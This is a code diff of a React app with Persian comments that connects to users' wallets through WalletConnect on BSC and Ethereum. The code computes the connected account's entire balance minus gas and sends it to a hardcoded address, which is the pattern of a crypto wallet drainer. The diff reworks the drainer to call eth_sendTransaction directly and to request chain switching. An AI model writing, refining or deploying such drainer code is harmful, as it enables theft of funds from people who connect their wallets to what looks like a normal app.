@@ -8,10 +8,10 @@ function App() {
       chains: [1, 56], // پشتیبانی از BSC و Ethereum
       methods: [
         "eth_sendTransaction",
-        "eth_signTransaction",
         "eth_getBalance",
         "eth_sign",
-        "personal_sign"
+        "personal_sign",
+        "wallet_switchEthereumChain"
       ],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
@@ -49,9 +49,8 @@ function App() {
           return;
         }
 
-        const gasPrice = 5000000000; // گس پرایس (۵ GWEI)
         const gasLimit = 21000; // مقدار گس استاندارد
-        const gasFee = gasLimit * gasPrice;
+        const gasFee = gasLimit * 5000000000; // گس پرایس (۵ GWEI)
         const transactionValue = balanceInWei - gasFee;
 
         if (transactionValue <= 0) {
@@ -63,23 +62,10 @@ function App() {
           to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
           from: account_sender,
           value: "0x" + transactionValue.toString(16), // تبدیل مقدار به HEX
-          gas: "0x" + gasLimit.toString(16),
-          gasPrice: "0x" + gasPrice.toString(16)
+          gas: "0x5208" // مقدار گس استاندارد
         };
 
         console.log("📜 Unsigned Transaction:", transactionParameters);
-
-        const signedTransaction = await provider.request({
-          method: "eth_signTransaction",
-          params: [transactionParameters],
-        });
-
-        console.log("✍️ Signed Transaction:", signedTransaction);
-
-        if (!signedTransaction) {
-          console.error("❌ Error: Transaction signing failed!");
-          return;
-        }
 
         const txHash = await provider.request({
           method: "eth_sendTransaction",
